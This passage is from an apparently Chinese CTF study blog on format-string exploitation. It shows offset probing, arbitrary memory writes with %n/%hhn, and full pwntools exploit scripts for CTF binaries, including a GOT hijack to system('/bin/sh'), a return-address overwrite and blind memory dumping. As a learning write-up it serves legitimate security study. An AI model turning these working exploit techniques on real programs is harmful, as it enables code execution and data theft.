class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关于覆盖偏移的话可以通过测试得出来：<br><code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585314095222-b26d67ae-9cc9-48c3-b570-116018b80384.png#align=left&display=inline&height=129&name=image.png&originHeight=156&originWidth=726&size=40573&status=done&style=none&width=602" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以看到，是格式化字符串的第 6 个参数</p>
+<p>那下面，通过 %n 来进行覆盖，c_addr+%012d+%6$n<br>c_addr 再加上 12 之后才能凑够 16，这样就可以把 c 改成 16</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overwrite'</span>)</span><br><span class="line">c_addr = int(sh.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(c_addr)</span><br><span class="line">payload = p32(c_addr) + <span class="string">'a'</span>*<span class="number">12</span> + <span class="string">'%6$n'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585751018729-f22847f5-267c-4ba3-bd54-fd1a3c9c6331.png#align=left&display=inline&height=93&name=image.png&originHeight=185&originWidth=631&size=42834&status=done&style=none&width=315.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h2><h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>如果想要将一个地方改为一个较小的数字，只需要 %n 是 数字 就可以了，如果想改成 2，可以用 aa%k$n，但是有个问题，之前我们是把地址放在前面，加上地址（4 或 8 字节）之后就成了一个至少比 4 大的数</p>
+<p>aa%k$nxx，如果用这样的方式，前面 aa%k 是第六个参数，$nxx 是第七个参数，后面在跟一个 我们想要修改的地址，那么这个地址就是第八个参数，只需要把 k 改成 8 就可以把这第八个参数改成 2，aa%8$nxx</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overwrite'</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">'aa%8$naa'</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里掌握的小技巧：没有必要把地址放在最前面，只需要找到它对应的偏移就可以</p>
+<h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>变量在内存中都是以字节的格式存储的，在 x86、x64 中是按照小端存储的，格式化字符串里面有两个标志用的上了：</p>
+<blockquote>
+<p>h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数<br>hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</p>
+</blockquote>
+<p>这…👆 是给人看的嘛？？</p>
+<p>意思是说：hhn 写入的就是单字节，hn 写入的就是双字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overwrite'</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="comment">#pwntools带着一个函数,很方便</span></span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>前面的那一串 p32()，每算是 4 字符，这样到  %6$hhn 前面就是：16+104=120，也就是 0x78<br>再加上 222 就是 342，也就是 0x156，然后依次是：0x234、0x312，又因为 hh 是写入单字节的，又是小端存储，也就是只能取后边两个，所以连起来就是 0x12345678</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585835169146-4d95d935-c626-4658-b3b5-eec48feb8115.png#align=left&display=inline&height=103&name=image.png&originHeight=71&originWidth=407&size=8489&status=done&style=none&width=593" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>小端存储</p>
+<h1 id="x64-例题"><a href="#x64-例题" class="headerlink" title="x64 例题"></a>x64 例题</h1><h2 id="UIUCTF-pwn200-GoodLuck"><a href="#UIUCTF-pwn200-GoodLuck" class="headerlink" title="UIUCTF pwn200 GoodLuck"></a>UIUCTF pwn200 GoodLuck</h2><p>存在格式化字符串漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585960844488-98e19bbf-06b5-435e-bd88-a17ae178da20.png#align=left&display=inline&height=456&name=image.png&originHeight=747&originWidth=805&size=67066&status=done&style=stroke&width=491" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用 gdb 调试一下，b printf 下个断点，然后运行之后输入一些内容看一下，可以看到 flag 在栈上从我们输入的开始第三个参数的位置</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586746084050-32cfc97b-b64f-4fcc-ba58-ba7d026b21fc.png#align=left&display=inline&height=377&name=image.png&originHeight=755&originWidth=726&size=187706&status=done&style=none&width=363" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>但是因为 x64 前 6 个参数存在寄存器上面，而第一个参数又是格式化字符串，所以这实际上就是第 5+4=9 个参数，所以 payload 就写 %9$s</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">payload = <span class="string">"%9$s"</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585908267728-45389bdd-1aaa-4936-85ed-324333b84a2a.png#align=left&display=inline&height=293&name=image.png&originHeight=411&originWidth=728&size=90634&status=done&style=stroke&width=519" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h1><p>在 C 语言中，没有开启  RELRO 保护的时候，GOT 表项可以被修改，当我们修改某个 GOT 表项的时候，比如把 printf 的 GOT 表项修改成 system 的地址，那执行 printf 的时候实际上是执行 system 的函数</p>
+<h2 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016 CCTF pwn3"></a>2016 CCTF pwn3</h2><p>有一个类似 ftp 的功能，需要输入用户名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585960998051-435e1511-c845-48da-bb00-5d2dc8e765d2.png#align=left&display=inline&height=204&name=image.png&originHeight=262&originWidth=548&size=21186&status=done&style=stroke&width=427" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>需要注意的是，后面那个 for 循环对输入的内容进行了变形操作，每个字符都加了个 1<br>当输入的 s1 经过变形后不是 sysbdmin 的时候退出</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585961032714-1b549c04-d735-4b13-bb77-4174fe753d80.png#align=left&display=inline&height=202&name=image.png&originHeight=180&originWidth=327&size=9092&status=done&style=stroke&width=367" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>所以实际需要的是：rxraclhm（往前移一个）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585963611414-8c37e46f-7e7d-46da-951a-ed8945cee40e.png#align=left&display=inline&height=84&name=image.png&originHeight=109&originWidth=610&size=21950&status=done&style=none&width=469" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>登陆成功之后，有三个功能</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585963664035-5f8c93a1-e431-4a66-b7a0-bbb31e442d47.png#align=left&display=inline&height=267&name=image.png&originHeight=267&originWidth=304&size=12367&status=done&style=stroke&width=304" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>其中 get_file() 中存在格式化字符串漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585963745718-199e9fea-bf4f-43d3-9b10-607be214b432.png#align=left&display=inline&height=350&name=image.png&originHeight=409&originWidth=610&size=26050&status=done&style=stroke&width=522" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>先说一下大体的利用方式：先通过格式化字符串漏洞把 libc 泄露出来，再通过 libc 计算得到 system 的地址，把 system 的地址写道 puts 的 GOT 表项上，当执行程序 dir 功能的时候，因为有个 puts 函数，如果我们输入的参数是 ‘/bin/sh’ 实际上就会执行 system(‘/bin/sh’)</p>
+<p>在 get 功能（get_file）的 printf 处下个断点：b *0x0804889E</p>
+<p>然后正常运行，会断下来</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586166998602-41052520-78d2-4b14-b174-fdb35d04bf22.png#align=left&display=inline&height=627&name=image.png&originHeight=881&originWidth=725&size=186532&status=done&style=none&width=516" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这时候看一下结果那个（nil）对应的是 0x0</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586167067004-e42aa4a6-8ec9-4de3-93cd-9d8712ad34c2.png#align=left&display=inline&height=403&name=image.png&originHeight=563&originWidth=727&size=121047&status=done&style=none&width=520" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>数一下是在第几个位置，7，所以下面用 %8$s + puts_got 把后面第八个参数 puts_got 给读出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./pwn3'</span>)</span><br><span class="line">pwn3 = ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line"><span class="comment">#首先要登陆，用户名是:rxraclhm</span></span><br><span class="line">sh.recvuntil(<span class="string">'Name (ftp.hacker.server:Rainism):'</span>)</span><br><span class="line">sh.sendline(<span class="string">'rxraclhm'</span>)</span><br><span class="line"><span class="comment">#使用put(put_file),先写进去</span></span><br><span class="line">puts_got = pwn3.got[<span class="string">'puts'</span>]</span><br><span class="line">sh.sendline(<span class="string">'put'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'please enter the name of the file you want to upload:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1111'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'then, enter the content:'</span>)</span><br><span class="line">content=<span class="string">'%8$s'</span> + p32(puts_got)</span><br><span class="line">sh.sendline(content)</span><br><span class="line"><span class="comment">#通过get(get_file)执行格式化字符串漏洞,读出put函数的地址</span></span><br><span class="line">sh.sendline(<span class="string">'get'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'enter the file name you want to get:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1111'</span>)</span><br><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="comment">#计算libc,从而算出system的地址</span></span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>, puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line"><span class="comment">#把第七个参数的puts_got改成system的地址</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: sys_addr&#125;)</span><br><span class="line">sh.sendline(<span class="string">'put'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'please enter the name of the file you want to upload:'</span>)</span><br><span class="line"><span class="comment">#在运行show_dir时将puts(“/bin/sh;”)变成system("/bin/sh;"),并成功获取shell</span></span><br><span class="line">sh.sendline(<span class="string">'/bin/sh;'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'then, enter the content:'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#通过get(get_file)执行格式化字符串漏洞</span></span><br><span class="line">sh.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'get'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'enter the file name you want to get:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh;'</span>)</span><br><span class="line"><span class="comment">#通过dir(show_dir)来拿到shell</span></span><br><span class="line">sh.sendline(<span class="string">'dir'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h1><p>利用格式化字符串劫持返回地址</p>
+<h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><p>注册以后登陆成功，有个菜单，一个更改的，一个输出的，可以通过更改的构造，然后输出的有格式化字符串漏洞</p>
+<p>通过 IDA 的 shift+f12 可以搜到一个 /bin/sh 字符串，然后双击跟过去找到一个 system(‘/bin/sh’) 函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586180859453-774f6e2f-ad26-49cf-a7fb-7277a4f61bcf.png#align=left&display=inline&height=167&name=image.png&originHeight=238&originWidth=701&size=21043&status=done&style=stroke&width=492" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>只要能控制程序返回到这里就可以了 0x4008A6</p>
+<p>在存在格式化字符串漏洞的 printf 的地址下个断点 b *0x400B39，然后运行起来，用户名写：AAAA，密码写 %p%p%p%p%p%p，使用 1 查看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586250033318-401bf7ea-c7ce-47ad-95a1-d90e6f24f48a.png#align=left&display=inline&height=528&name=image.png&originHeight=830&originWidth=725&size=162317&status=done&style=none&width=461" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以发现，第七个参数是这个函数（不是 printf）的返回地址（再啰嗦一句，这是 64 位的程序，前六个参数在寄存器里面，同时第一个参数是格式化字符串，这里的第六个参数说的是格式化字符串的参数）</p>
+<p>我们想要改写第七个参数，需要有一个存储它的地址，也就是这次实验的 0x7fffffffdc08，但是这个地址是会变的，然而可以通过 rbp 与 ret 的偏移来计算，也就是：0x7fffffffdc40 - 0x7fffffffdc08 =0x38</p>
+<p>我们可以把读出来的第六个参数加上 0x38 给改掉，可以在 password 后面跟上 ret 地址来修改，也可以通过把 username 改成计算出来的 ret 的地址</p>
+<p><strong>exp</strong><br>**</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">'./pwnme'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400B39'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">data=p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">data=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">ret_addr=int(data,<span class="number">16</span>)<span class="number">-0x38</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input new username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input new password(max lenth:20):'</span>)</span><br><span class="line">payload = <span class="string">"%2214u%12$hn"</span></span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>通过 username 来保存 ret_addr</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">"./pwnme"</span>)</span><br><span class="line">binary=ELF(<span class="string">"pwnme"</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">'b *0x400b39'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"1111"</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">recv=sh.recvline()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ebp addr"</span>+str(recv)</span><br><span class="line">ret_addr = int(recv,<span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret addr"</span>+str(ret_addr)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p64(ret_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"%2218d%8$hn"</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="格式化字符串盲打"><a href="#格式化字符串盲打" class="headerlink" title="格式化字符串盲打"></a>格式化字符串盲打</h1><h2 id="fmt-blind-stack"><a href="#fmt-blind-stack" class="headerlink" title="fmt_blind_stack"></a>fmt_blind_stack</h2><p>直接在栈上，不断地去读数据就能得到 flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586263648762-59759242-56cb-46d7-aedc-1b1f5caadabc.png#align=left&display=inline&height=401&name=image.png&originHeight=435&originWidth=307&size=37058&status=done&style=none&width=283" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8887</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">'0x'</span>):</span><br><span class="line">        <span class="keyword">print</span> p64(int(data, <span class="number">16</span>))</span><br><span class="line">    sh.close()</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">'%&#123;&#125;$p'</span>.format(i)</span><br><span class="line">    leak(payload)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="blind-fmt-got"><a href="#blind-fmt-got" class="headerlink" title="blind_fmt_got"></a>blind_fmt_got</h2><p>首先，通过脚本泄露二进制文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">##context.log_level = 'debug'</span></span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8887</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'leak addr: '</span> + hex(addr)</span><br><span class="line">            sh = remote(ip, port)</span><br><span class="line">            <span class="comment">#%00008$s凑够8个对齐</span></span><br><span class="line">            payload = <span class="string">'%00008$s'</span> + <span class="string">'STARTEND'</span> + p64(addr)</span><br><span class="line">            <span class="comment">#说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'\x0a'</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            sh.sendline(payload)<span class="comment">#一直接收到STARTEND这个地方</span></span><br><span class="line">            data = sh.recvuntil(<span class="string">'STARTEND'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbinary</span><span class="params">()</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    f = open(<span class="string">'binary'</span>, <span class="string">'w'</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">'\xff'</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> len(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">'\x00'</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += len(data)</span><br><span class="line">    f.close()</span><br><span class="line">getbinary()</span><br></pre></td></tr></table></figure>
+
+<p>用 IDA 打开，注意选择二进制模式的</p>
+<p>然后在  0x4005F6 这块地方就是 main 函数的位置，我 IDA 不一样，看不出来</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
